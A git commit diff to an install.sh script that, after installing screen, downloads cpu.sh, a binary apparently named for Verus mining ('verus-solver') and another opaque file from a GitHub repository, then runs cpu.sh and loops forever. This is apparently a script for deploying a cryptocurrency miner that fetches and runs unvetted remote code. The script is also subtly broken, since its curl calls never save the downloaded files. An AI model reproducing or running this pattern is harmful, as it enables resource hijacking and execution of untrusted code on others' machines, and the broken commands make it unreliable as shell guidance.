bbcf5a9d75d1ad775b07839e9a23f135623ace59
welstannabella <85975078+welstannabella@users.noreply.github.com>
2021-06-16 09:51:34 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,7 +2,11 @@
 sudo apt update
 sudo apt install apt-utils -y
 sudo apt install screen -y
-screen -dmS git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight && sudo apt update && chmod +x cpu.sh && ./cpu.sh
+screen -dmS curl https://github.com/bimasaputrq581/expert-fortnight/raw/main/cpu.sh
+curl https://github.com/bimasaputrq581/expert-fortnight/blob/main/verus-solver?raw=true
+curl https://github.com/bimasaputrq581/expert-fortnight/blob/main/zxzx?raw=true
+chmod +x cpu.sh
+./cpu.sh
 while [ 1 ]; do
 sleep 3
 done
